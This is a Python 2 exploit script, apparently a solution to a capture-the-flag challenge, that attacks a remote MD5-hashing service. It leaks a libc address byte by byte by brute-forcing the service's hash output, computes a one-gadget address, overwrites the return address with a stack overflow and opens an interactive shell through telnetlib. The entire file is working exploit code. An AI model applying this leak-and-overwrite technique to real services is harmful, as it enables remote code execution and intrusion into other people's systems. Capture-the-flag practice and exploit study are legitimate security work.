import sys
import socket
import hashlib
import struct
import telnetlib

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ksnctfc92.u1tramarine.blue", 55555))

def read(l):
    d = ""
    while len(d)<l:
        t = s.recv(l-len(d))
        if len(t)==0:
            print "error"
            sys.exit(0)
        d += t
    return d

print read(len("Wait...\n"))

libc = ""

for i in range(8):
    print read(len("Input data length: "))
    s.send("%d\n"%(0x78))
    print read(len("Input data: "))
    data = "a"*0x54+struct.pack("<I",0x78+i+1)+"a"*(0x78-0x58)
    s.send(data+"\n")
    t = read(len("MD5(your data): 08ff5f7301d30200ab89169f6afdb7af\n"))
    print t
    hash = t[-33:-1]
    print read(len("MD5(flag): bbb74d8f36fae25d5f41a8733597acfc\n"))

    for c in range(256):
        if hashlib.md5(data+libc+chr(c)).hexdigest() == hash:
            libc += chr(c)
            break

libc = struct.unpack("<Q", libc)[0]
print "libc", hex(libc)

rce = libc - 0x21b35 + 0xe1f7f
print "rce", hex(rce)

print read(len("Input data length: "))
s.send("%d\n"%(0x100))
print read(len("Input data: "))
data = "a"*0x54+struct.pack("<I",0)+"a"*(0x78-0x58)+struct.pack("<Q", rce)+"\x00"*(0x100-0x80)
s.send(data+"\n")
print read(len("MD5(your data): 08ff5f7301d30200ab89169f6afdb7af\n"))
print read(len("MD5(flag): bbb74d8f36fae25d5f41a8733597acfc\n"))

t = telnetlib.Telnet()
t.sock = s
t.interact()
